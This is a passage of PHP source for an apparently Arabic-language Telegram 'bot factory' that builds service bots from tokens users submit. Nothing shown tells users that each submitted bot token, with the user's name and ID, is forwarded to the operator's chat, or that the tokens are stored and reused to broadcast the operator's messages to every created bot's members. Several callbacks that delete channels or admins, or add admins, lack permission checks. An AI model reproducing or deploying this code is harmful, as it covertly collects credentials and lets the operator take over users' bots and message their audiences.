*يجب عليك ارسال رابط القناة الخاص قم بارسالة الان
 ",
 'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- الغاء ",'callback_data'=>"addchannel"]],
 ]])]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"❌ البوت ليس ادمن في القناة 
- قم برفع البوت اولا لكي تتمكن من إضافتها 
 ",
'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- إعادة المحاولة ",'callback_data'=>"addchannel"]],
 ]])]);
}}
$infoNaMero["info"]["amr"]="channel_id";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
$channel_id=$infoNaMero["info"]["channel_id"];
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="channel_id" and in_array($from_id,$NaMero) and !$message->forward_from_chat ){
$checkadmin = getChatstats($channel_id,$token);
if($checkadmin == true){
$namechannel = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$channel_id"))->result->title;
$infoNaMero["info"]["channel"][$channel_id]["st"]="خاصة";
$infoNaMero["info"]["channel"][$channel_id]["user"]="$text";
$infoNaMero["info"]["channel"][$channel_id]["name"]="$namechannel";
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"• تم إضافة القناة بنجاح عزيزي الادمن 👍
---------------------------
الرابط : $text 
الاسم : $namechannel
الايدي : $channel_id
 ",
 'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- إضافة قناة آخرى",'callback_data'=>"addchannel"]],
 ]])]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"❌ البوت ليس ادمن في القناة 
- قم برفع البوت اولا لكي تتمكن من إضافتها 
 ",
'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- إعادة المحاولة ",'callback_data'=>"addchannel"]],
 ]])]);
}
$infoNaMero["info"]["amr"]="null";
$infoNaMero["info"]["channel_id"]="null";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($data == "viwechannel" and in_array($from_id, $NaMero)){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$orothe= $infoNaMero["info"]["channel"];
$keyboard["inline_keyboard"]=[];
foreach($orothe as $co ){
$namechannel= $co["name"];
$st= $co["st"];
$userchannel= $co["user"];
if($namechannel!=null){
$keyboard["inline_keyboard"][] = [['text'=>$namechannel,'callback_data'=>'null']];
if($st=="خاصة"){
$userchannel="null";
}
$keyboard["inline_keyboard"][] =
[['text'=>$userchannel,'callback_data'=>'cull'],['text'=>$st,'callback_data'=>'null']];
}}
$keyboard["inline_keyboard"][] = [['text'=>"- • رجوع •",'callback_data'=>"home"]];
$reply_markup=json_encode($keyboard);
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- هذة هي قنوات الاشتراك الاجباري الخاصة بك 
",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>$reply_markup
]);}
if($data == "delchannel" and in_array($from_id, $NaMero)){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$orothe= $infoNaMero["info"]["channel"];
$keyboard["inline_keyboard"]=[];
foreach($orothe as $co=>$s ){
$namechannel= $s["name"];
$st= $s["st"];
$userchannel= $s["user"];
if($namechannel!=null){
$keyboard["inline_keyboard"][] = [['text'=>$namechannel,'callback_data'=>'null']];
if($st=="خاصة"){
$userchannel="null";
}
$keyboard["inline_keyboard"][] =
[['text'=>'🚫 حذف','callback_data'=>'deletchannel '.$co],['text'=>$st,'callback_data'=>'null']];
}}
$keyboard["inline_keyboard"][] = [['text'=>"- • رجوع •",'callback_data'=>"home"]];
$reply_markup=json_encode($keyboard);
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- قم بالضغط على خيار الحذف بالاسفل 
",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>$reply_markup
]);
}
if(preg_match('/^(deletchannel) (.*)/s', $data)){
$nn = str_replace('deletchannel ',"",$data);
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم حذف القناة بنجاح 
-id $nn
",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- • رجوع •",'callback_data'=>"delchannel"]],
 ]])]);
unset($infoNaMero["info"]["channel"][$nn]);
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($message and $fwrmember=="✅"){
bot('ForwardMessage',[
 'chat_id'=>$admin,
 'from_chat_id'=>$chat_id,
 'message_id'=>$message->message_id,
]);
}
#قسم الاذاعة
$amr = file_get_contents("NaMero/amr.txt");
$no3send =file_get_contents("no3send.txt");
$chatsend=file_get_contents("chatsend.txt");
if($data == "sendmessage" and in_array($from_id,$NaMero)){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'text'=>"• أهلا بك عزيزي في قسم الاذاعة 🔥
----------------------------
- قم بتحديد نوع الاذاعة ومكان ارسال الاذاعة
ثم قم الضغط على ارسال الرسالة 📬
",'message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"نوع الاذاعة : $no3send",'callback_data'=>"button"]],
[['text'=>"توجية",'callback_data'=>"forward"],
['text'=>"ماركدون",'callback_data'=>"MARKDOWN"],['text'=>"اتش تي ام ال",'callback_data'=>"HTML"]],
[['text'=>"الارسال الى: $chatsend",'callback_data'=>"button"]],
[['text'=>"الاعضاء",'callback_data'=>"member"],
['text'=>"كل البوتات",'callback_data'=>"botsall"]],
[['text'=>"ارسال الرسالة",'callback_data'=>"post"]],
[['text'=>" - ال• رجوع • ",'callback_data'=>"home"]],
]])]);}
function sendNAMERO2($chat_id,$message_id){
$no3send =file_get_contents("no3send.txt");
$chatsend=file_get_contents("chatsend.txt");
bot('EditMessageText',[
'chat_id'=>$chat_id,
'text'=>"• أهلا بك عزيزي في قسم الاذاعة 🔥
----------------------------
- قم بتحديد نوع الاذاعة ومكان ارسال الاذاعة
ثم قم الضغط على ارسال الرسالة 📬
",'message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"نوع الاذاعة : $no3send",'callback_data'=>"button"]],
[['text'=>"توجية",'callback_data'=>"forward"],
['text'=>"ماركدون",'callback_data'=>"MARKDOWN"],['text'=>"اتش تي ام ال",'callback_data'=>"HTML"]],
[['text'=>"الارسال الى: $chatsend",'callback_data'=>"button"]],
[['text'=>"الاعضاء",'callback_data'=>"member"],
['text'=>"كل البوتات",'callback_data'=>"botsall"]],
[['text'=>"ارسال الرسالة",'callback_data'=>"post"]],
[['text'=>" - ال• رجوع • ",'callback_data'=>"home"]],
]])]);} 
###NAMERO### 
if($data == "forward"){
file_put_contents("no3send.txt","forward");
sendNAMERO2($chat_id,$message_id);
}
if($data == "MARKDOWN"){
file_put_contents("no3send.txt","MARKDOWN");
sendNAMERO2($chat_id,$message_id);
}
if($data == "HTML"){
file_put_contents("no3send.txt","html");
sendNAMERO2($chat_id,$message_id);
}
//~~~~~~~~~~~//
if($data == "member"){
file_put_contents("chatsend.txt","member");
sendNAMERO2($chat_id,$message_id);
}
if($data == "botsall"){
file_put_contents("chatsend.txt","botsall");
sendNAMERO2($chat_id,$message_id);
}
$no3send =file_get_contents("no3send.txt");
$chatsend=file_get_contents("chatsend.txt");
if($data == "post" and $no3send!=null and $chatsend!=null and in_array($from_id,$NaMero) ){
file_put_contents("NaMero/amr.txt","sendsend");
bot('EditMessageText',[
'message_id'=>$message_id,
'chat_id'=>$chat_id,
'text'=>"قم بارسال رسالتك الان
نوع الارسال : $no3send
مكان الارسال : $chatsend
",
'message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"set"]],
]])]);}
if($data == "set" and in_array($from_id,$NaMero) ){
unlink("NaMero/amr.txt");
bot('EditMessageText',[
'chat_id'=>$chat_id,
'text'=>"تم إلغاء الارسال بنجاح 
",
'message_id'=>$message_id,
]);} 
 ###NAMERO### 
$forward = $update->message->forward_from;
$photo=$message->photo;
$video=$message->video;
$document=$message->document;
$sticker=$message->sticker;
$voice=$message->voice;
$audio=$message->audio;
$member =file_get_contents("NaMero/member.txt");
if($photo){
$sens="sendphoto";
$file_id = $update->message->photo[1]->file_id;
}
if($document){
$sens="senddocument";
$file_id = $update->message->document->file_id;
}
if($video){
$sens="sendvideo";
$file_id = $update->message->video->file_id;
}
if($audio){
$sens="sendaudio";
$file_id = $update->message->audio->file_id;
}
if($voice){
$sens="sendvoice";
$file_id = $update->message->voice->file_id;
}
if($sticker){
$sens="sendsticker";
$file_id = $update->message->sticker->file_id;
}
##تنفيذ الاذاعة 
if($message and $text !="الاذاعة" and $amr == "sendsend" and $no3send=="forward" and in_array($from_id,$NaMero) ){
unlink("NaMero/amr.txt");
if($chatsend=="member"){
$for=$member;
$txt="تم التوجية - خاص - للاعضاء فقط";
$foor=explode("\n",$for);
bot('ForwardMessage',[
 'chat_id'=>$chat_id,
 'from_chat_id'=>$chat_id,
 'message_id'=>$message->message_id,
]);
for($i=0;$i<count($foor); $i++){
bot('ForwardMessage',[
 'chat_id'=>$foor[$i],
 'from_chat_id'=>$chat_id,
 'message_id'=>$message->message_id,
]);}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"✅ $txt
",
'message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'• رجوع • ' ,'callback_data'=>"home"]],
]])]);
}
if($chatsend=="botsall"){
$bots=explode("\n",file_get_contents("infoidbots.txt"));
$coo=count($bots)-1;
for ($i=0; $i < count($bots); $i++) { 
$idbots=$bots[$i];
include("NAMERO/$idbots.php");
$tokenboot="$tokenbot";
$mm=explode("\n",file_get_contents("botmak/$idbots/NaMero/member.txt"));
for ($l=0; $l < count($mm); $l++) {
$id=$mm[$l];
file_get_contents("https://api.telegram.org/bot".$tokenboot."/ForwardMessage?chat_id=".$id."&from_chat_id=$chat_id&message_id=".$message->message_id);
}
$co=$co+$l-1;
}
bot('sendmessage',[
'chat_id'=>$chat_id,
"text"=>"- تمت الاذاعة في جميع البوتات المصنوعة 
- تم الارسال الى $co مستخدم.
- عدد البوتات : $coo
",
'reply_to_message_id'=>$message_id,
]);}
unlink("no3send.txt");
unlink("chatsend.txt");
}
if($message and $text !="الاذاعة"and $amr == "sendsend"and $no3send !="forward" and in_array($from_id,$NaMero) ){
unlink("NaMero/amr.txt");
if($chatsend=="member"){
$for=$member;
$txt=" تم النشر - خاص - للاعضاء فقط";
$foor=explode("\n",$for);
if($text){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$text",
'parse_mode'=>"$no3send",
'disable_web_page_preview'=>true,
]);
for($i=0;$i<count($foor); $i++){
bot('sendMessage', [
'chat_id'=>$foor[$i],
'text'=>"$text",
'parse_mode'=>"$no3send",
'disable_web_page_preview'=>true,
]);
}
}else{
$ss=str_replace("send","",$sens);
bot($sens,[
"chat_id"=>$chat_id,
"$ss"=>"$file_id",
'caption'=>"$caption",
]);
for($i=0;$i<count($foor); $i++){
$ss=str_replace("send","",$sens);
bot($sens,[
"chat_id"=>$foor[$i],
"$ss"=>"$file_id",
'caption'=>"$caption",
]);}
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"✅ $txt
"
,'message_id'=>$message_id,
 'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>' • رجوع • ' ,'callback_data'=>"home"]],
]])]);
unlink("no3send.txt");
unlink("chatsend.txt");
}
if($chatsend=="botsall"){
$bots=explode("\n",file_get_contents("infoidbots.txt"));
$coo=count($bots)-1;
for ($i=0; $i < count($bots); $i++) { 
$idbots=$bots[$i];
include("NAMERO/$idbots.php");
$tokenboot="$tokenbot";
$mm=explode("\n",file_get_contents("botmak/$idbots/NaMero/member.txt"));
for ($l=0; $l < count($mm); $l++) {
$id=$mm[$l];
if($text){
file_get_contents("https://api.telegram.org/bot".$tokenboot."/sendMessage?chat_id=".$id."&text=$text&parse_mode=".$no3send);
}else{
$ss=str_replace("send","",$sens);
file_get_contents("https://api.telegram.org/bot".$tokenboot."/$sens?chat_id=".$id."&$ss=$file_id&caption=".$caption);
}}
$co=$co+$l-1;
}
bot('sendmessage',[
'chat_id'=>$chat_id,
"text"=>"- تمت الاذاعة في جميع البوتات المصنوعة 
- تم الارسال الى $co مستخدم.
- عدد البوتات : $coo
",
'reply_to_message_id'=>$message_id,
]);
}}
if($data == "admins" and in_array($from_id,$NaMero) ){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$orothe= $infoNaMero["info"]["admins"];
$keyboard["inline_keyboard"]=[];
foreach($orothe as $co=>$sss ){
if($co!=null and $co!=$admin ){
$keyboard["inline_keyboard"][] =
[['text'=>' 🗑','callback_data'=>'deleteadmin '.$co.'#'.$sss],['text'=>$sss,'callback_data'=>'null']];
}}
$keyboard["inline_keyboard"][] = [['text'=>"- اضافة ادمن",'callback_data'=>"addadmin"]];
$keyboard["inline_keyboard"][] = [['text'=>"- • رجوع •",'callback_data'=>"home"]];
$reply_markup=json_encode($keyboard);
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- تستطيع فقط رفع 5 ادمنية 
*تنوية : الادمنية يستطيعون التحكم بإعدادات البوت ماعدا قسم الادمنية .
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>$reply_markup
]);}
if($data == "addadmin"){
$infoNaMero["info"]["amr"]="addadmin";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- قم بارسال ايدي الادمن 
",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);
}
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="addadmin" and in_array($from_id,$NaMero) and is_numeric($text)){
if(!in_array($text,$admins)){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$orothe= $infoNaMero["info"]["channel"];
$count=count($orothe);
if($count<6){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم حفظرفع الادمن بنجاح",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"admins"]],
]])]);
$infoNaMero["info"]["admins"][]="$text";
}else{
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"🚫 لايمكنك اضافة اكثر من 5 ادمنية ً",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"admins"]],
]])]);}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"- ⚠ الادمن مضاف مسبقاً",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"admins"]],
]])]);}
$infoNaMero["info"]["amr"]="null";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if(preg_match('/^(deleteadmin) (.*)/s', $data)){
$nn = str_replace('deleteadmin ',"",$data);
$ex=explode('#',$nn);
$id=$ex[1];
$n=$ex[0];
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم حذف الادمن بنجاح 
-id $id
",
#'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- • رجوع •",'callback_data'=>"admins"]],
 ]])
]);
unset($infoNaMero["info"]["admins"][$n]);
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
$botfree=explode("\n",file_get_contents("from_id/$from_id/countuserbot.txt"));
$countbot=count($botfree)-1;
$infobots=file_get_contents("from_id/$from_id/countuserbot.txt");
if($infobots!=null ){
$infobotsmember=" ";
}else{
$infobotsmember="لم تقم بصنع اي بوت مسبقا ❌ً";
}
if($start==null){
$start="• مرحبا بك عزيزي Namero في مصنع البوتات الخدمي 📬

- اصنع العديد من البوتات بكل سهوله من الاسفل 🔥";
}
if($info_kl==null){
$info_kl="• مرحبا بك عزيزي Namero في مصنع البوتات الخدمي 📬

- اصنع العديد من البوتات بكل سهوله من الاسفل 🔥

- البوتات بدون حقوق اعلانات مزعجه 👍

- تابع قناتنا من هنا: @Namerobots 🎉
" 
;
}
if($token_kl==null){
$token_kl="• أرسل التوكن الخاص بك الآن لصنع بوت 
 خاص بك :
- إذا كنت لا تعلم كيف يمكنك الحصول على توكن اضغط على زر شرح صنع توكن خاص بك
";
}
$amrmem=file_get_contents("from_id/$from_id/amr.txt");
if($text=="/start"){
mkdir("from_id");
mkdir("from_id/$from_id");
file_put_contents("from_id/$from_id/amr.txt","");
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>"
$start

",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'معلومات أكثر عن البوت 📬 ' ,'callback_data'=>"infobot"]],
[['text'=>'صنع بوت جديد ' ,'callback_data'=>"sn3botfre"],
['text'=>'قائمة بوتاتك ' ,'callback_data'=>"botsmember"]],
[['text'=>'اضافة ملف الى الصانع ' ,'callback_data'=>"airbcsss"]],
[['text'=>'قناة تحديثات البوت 🌴 ' ,'url'=>"https://t.me/".$updatechannel]],
]])]);}
if($data=="infobot"){
file_put_contents("from_id/$from_id/amr.txt","");
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>" 
$info_kl
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'• رجوع •' ,'callback_data'=>"freebot"]],
]])]);}
if($data=="freebot"){
file_put_contents("from_id/$from_id/amr.txt","");
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>"
$start

",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'معلومات أكثر عن البوت 📬 ' ,'callback_data'=>"infobot"]],
[['text'=>'صنع بوت جديد ' ,'callback_data'=>"sn3botfre"],
['text'=>' قائمة بوتاتك ' ,'callback_data'=>"botsmember"]],
[['text'=>'اضافة ملف الى الصانع ' ,'callback_data'=>"uplode"]],
[['text'=>'قناة تحديثات البوت 🌴 ' ,'url'=>"https://t.me/".$updatechannel]],
]])]);}

if($data == "airbcsss"){
bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,
'text'=>'ar',
]);
sleep (1);
for($i = 0;$i <= count($sttingsid)-1;$i++){
$fromid = $sttingsid[$i]; 
$membr=json_decode(file_get_contents("data/$fromid.json"),true);
if($membr[$fromid]["l"] > 0){
$move["bob"][$fromid] =$membr[$fromid]["l"];
file_put_contents("data/$from_id.json",json_encode($move,128|34|256)); 
}
}
$array = [];

foreach($move["bob"] as $key => $value){
$array[$key] = $value;
}
$txt = null;
for($i=1;$i<=5;$i++){
if(!empty($array)){
$arrayValues = array_values($array);
$maxKey = array_search(max($arrayValues),$arrayValues);
$member = array_keys($array)[$maxKey];
$count = $arrayValues[$maxKey];
$kk = array("1","2","3","4","5");
$kk1 = array("🥇","🥈","🥉","🏅","🏅");
$ii = str_replace($kk, $kk1, $i);
$k = $membr[$member]['s']; 
$txt .= "$ii :($count) -> [$member](tg://user?id=$member)\n";
unset($array[$member]);
}
}
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
$start

"
, 
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>'true',
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'معلومات أكثر عن البوت 📬 ' ,'callback_data'=>"infobot"]],
[['text'=>'صنع بوت جديد ' ,'callback_data'=>"sn3botfre"],
['text'=>' قائمة بوتاتك ' ,'callback_data'=>"botsmember"]],
[['text'=>'اضافة ملف الى الصانع ' ,'callback_data'=>"uplode"]],
[['text'=>'قناة تحديثات البوت 🌴 ' ,'url'=>"https://t.me/".$updatechannel]],
]])
]);
}

///by @NameroBots
//by @S_P_P1
/// Programmer Namero (Rights are not allowed to change ⚡) 



if($data=="sn3botfre"){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>"• اختر من القائمة : 
- امامك بوتات خدميه متعدده 🍾
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>' صانع بوتات ' ,'callback_data'=>"NAMERO 1"]],
[['text'=>' اضافه الالوان الى الصور ' ,'callback_data'=>"NAMERO 2"]],
[['text'=>'بوت المتجر ' ,'callback_data'=>"NAMERO 3"],['text'=>'تواصل' ,'callback_data'=>"NAMERO 4"]],
[['text'=>'بوت رشق ' ,'callback_data'=>"NAMERO 5"],['text'=>' بوت تمويل' ,'callback_data'=>"NAMERO 6"]],
[['text'=>'بوت زخرفه ' ,'callback_data'=>"NAMERO 7"],['text'=>' بوت همسه ' ,'callback_data'=>"NAMERO 8"]],
[['text'=>'بوت سمسمي ' ,'callback_data'=>"NAMERO 9"],['text'=>' بوت ويبهوك ' ,'callback_data'=>"NAMERO 10"]],
[['text'=>'بوت ليكات المسابقات' ,'callback_data'=>"NAMERO 11"],['text'=>' بوت ازرار ' ,'callback_data'=>"NAMERO 12"]],
[['text'=>'بوت حنايه من التفليش' ,'callback_data'=>"NAMERO 13"]],
[['text'=>'•رجوع• ' ,'callback_data'=>"freebot"]],
]])]);}

$botsList = [
    1=>"صانع بوتات ",
    2=>"بوت اضافه الالوان الي الصور",
    3=>"بوت المتجر",
    4=>"بوت تواصل",
    5=>"بوت الرشق",
    6=>"بوت التمويل",
    7=>"بوت زخرفه",
    8=>"بوت همسه",
    9=>"بوت سمسمي",
    10=>"بوت الويب هوك",
    11=>"بوت ليكات المسابقات",
    12=>"بوت الازرار ",
    13=>"بوت حمايه من التفليش"
];

$botfree = explode("\n",file_get_contents("from_id/$from_id/countbot.txt"));
$countbot = count($botfree);

if(preg_match('/^NAMERO (\d+)/', $data, $match)){
    $nu = (int)$match[1];
    $b = isset($botsList[$nu]) ? $botsList[$nu] : "بوت غير معروف";
    
    file_put_contents("from_id/$from_id/botmak.txt","NAMERO$nu");
    file_put_contents("from_id/$from_id/s_p_p1.txt","$b");
    file_put_contents("from_id/$from_id/amr.txt","sn3free");
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>" [• أرسل التوكن الخاص بك الآن لصنع $b خاص بك : ](https://t.me/botfather)
*- إذا كنت لا تعلم كيف يمكنك الحصول على توكن اضغط على زر شرح صنع توكن خاص بك*
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'• شرح صنع توكن خاص بك •' ,'callback_data'=>"asei8"]],
[['text'=>' • رجوع • ' ,'callback_data'=>"freebot"]],
]])]);
}
if ($data == "asei8") {
$b = file_get_contents("from_id/$from_id/s_p_p1.txt"); 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
*يمكنك صنع توكن خاص بك عن طريق اتباع الخطوات الاتيه :
*
1. اذهب الى ( @botfather ) وارسل /start 
2. قم بتوجيه الرسائل التاليه الى [بوت فاذر ](http://t.me/botfather)
3. قم بتوجيه اخر رساله يقوم بارسالها [بوت فاذر](http://t.me/botfather) لك الى هنا .
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);

bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"/newbot",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);

bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"$b", 
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
$s = substr(str_shuffle( '1234567890ASDFGHJKL'),1,3);
$s1 = substr(str_shuffle( '1234567890ASDFGHJKL'),1,6);
if($user !=null){
$bots ="$user$s"."bot";
}else{
$bots =$s1."bot";
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"[@$bots]",
 
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
unset($move["bob"]);
file_put_contents("data/@$userbot",json_encode($move,128|34|256)); 

mkdir("NAMERO");
if($text and $amrmem =="sn3free"){
file_put_contents("from_id/$from_id/amr.txt","");
$s_p_p1=file_get_contents("from_id/$from_id/s_p_p1.txt");
$botmak=file_get_contents("from_id/$from_id/botmak.txt");
$url = "https://api.telegram.org/bot".$text."/getWebhookInfo";
$check_token = json_decode(file_get_contents($url));
$check = $check_token;
$yes=$check->ok ;
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
"text"=>"جاري المعالجه... 🔄",
]);
if($yes == "true"){
    $url = "https://api.telegram.org/bot$text/getMe";
    $getidbots = json_decode(file_get_contents($url), true);
    $idbot    = trim($getidbots['result']['id']);
    $userbot  = trim($getidbots['result']['username']);
    $name1bot = $getidbots["result"]["first_name"];
    @mkdir("botmak");
    @mkdir("user");
    @mkdir("botmak/$idbot");
    $infobots = "$userbot==code#$userbot#$idbot";
    if(!in_array($userbot, file("from_id/$from_id/countbot.txt", FILE_IGNORE_NEW_LINES))){
        file_put_contents("from_id/$from_id/countuserbot.txt", "@$userbot\n", FILE_APPEND);
        file_put_contents("from_id/$from_id/countbot.txt", "$userbot\n", FILE_APPEND);
    }
    if(!in_array($infobots, file("from_id/$from_id/idbot.txt", FILE_IGNORE_NEW_LINES))){
        file_put_contents("from_id/$from_id/idbot.txt", "$infobots\n", FILE_APPEND);
    }
    if(!in_array($from_id, file("botfreeid.txt", FILE_IGNORE_NEW_LINES))){
        file_put_contents("botfreeid.txt", "$from_id\n", FILE_APPEND);
    }
    if(!in_array($idbot, file("infoidbots.txt", FILE_IGNORE_NEW_LINES))){
        file_put_contents("infoidbots.txt", "$idbot\n", FILE_APPEND);
    }
    file_put_contents("botmak/$idbot/admin.txt", $from_id);
    $mak = str_replace(
       ["@s_P_p1", "@NameroBots"],
        [$text, $token],
        file_get_contents("bots/mak.php")
    );
    $bot = str_replace("<?php#*NAMERO*", $mak, file_get_contents("bots/botmak.php"));
    file_put_contents("botmak/$idbot/$userbot.php", $bot);
    if(file_exists("bots/$botmak.php")){
        $bot = str_replace(
            ["@s_P_p1", "@NameroBots"],
            [$text, $token],
            file_get_contents("bots/$botmak.php")
        );
        file_put_contents("botmak/$idbot/$userbot.php", $bot);
    }
    file_get_contents("https://api.telegram.org/bot".$text."/setWebhook?url=".$saleh."/botmak/".$idbot."/$userbot.php");
    file_put_contents("botmak/$idbot/info.txt","-- محمي --\n$userbot\n$name1bot\n$from_id\n$idbot\n$botmak\n$s_p_p1");
    file_put_contents("user/$userbot.txt",$idbot);
    file_put_contents("NAMERO/$idbot.php",'<?php '."\n".'$tokenbot= "'.$text.'";');
    bot('editMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id+1,
        "text"=>"• تم إنشاء بوت *$s_p_p1* الخاص بك
• معرف البوت *:@$userbot*

[• مطور الملف 🤖](https://t.me/". $xx .")
",
        'parse_mode'=>"markdown",
        'disable_web_page_preview'=>true,
        'reply_to_message_id'=>$message->message_id,
        'reply_markup'=>json_encode([ 
            'inline_keyboard'=>[
                [['text'=>"دخول الى البوت",'url'=>"https://t.me/$userbot?start"]],
                [['text'=>"شرح تغير اسم البوت أو صوره",'url'=>$xxx]],
                [['text'=>' • رجوع • ' ,'callback_data'=>"freebot"]],
            ]
        ])
    ]);
bot('sendmessage',[
'chat_id'=>$SALEH,
'message_id'=>$message_id,
"text"=>" 
*تم صنع بوت جديد في الصانع الخاص بك 📝*
-----------------------
• معلومات الشخص الذي صنع البوت .

• الاسم : $name 
• الايدي : `$from_id` 
*•المعرف : @$user *
-----------------------
• نوع البوت المصنوع : $s_p_p1 
• معرف البوت المصنوع :[@$userbot]
-----------------------
• التوكن : `$text`
______________

*• عدد البوتات المصنوعة :* $countbots 
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
]])]);
}else{
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id+1,
"text"=>"• التوكن خطأ ! ",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'رجوع' ,'callback_data'=>"sn3botfre"]],
]])]);}}
$botfree=explode("\n",file_get_contents("botfreeid.txt"));
$botf=file_get_contents("from_id/$from_id/countuserbot.txt");
if($data=="botsmember"){
if(in_array($from_id, $botfree) and $botf != "" and $botf != " " and $botf!= null){
$idbotfrom=explode("\n",file_get_contents("from_id/$from_id/idbot.txt"));
$keyboard["inline_keyboard"]=[];
for ($i=0; $i < count($idbotfrom); $i++) { 
$ex = explode("#", $idbotfrom[$i]);
$idbot=$ex['2'];
$userbot="@".$ex['1'];
$in="infobot ".$ex['1'];
$number = strlen($idbot);
$infobot=explode("\n",file_get_contents("botmak/$idbot/info.txt"));
$userbott=$infobot['1'];
$namebot=$infobot['2'];
$id=$infobot['3'];
$idbots=$infobot['4'];
$s_p_p1=$infobot['6'];
if($number > 4){
$keyboard["inline_keyboard"][$i] = [['text'=>$userbot,'url'=>"t.me/$userbott"],
['text'=>$s_p_p1,'url'=>"t.me/$userbott"],['text'=>'معلومات اكثر ','callback_data'=>$in]];
}}
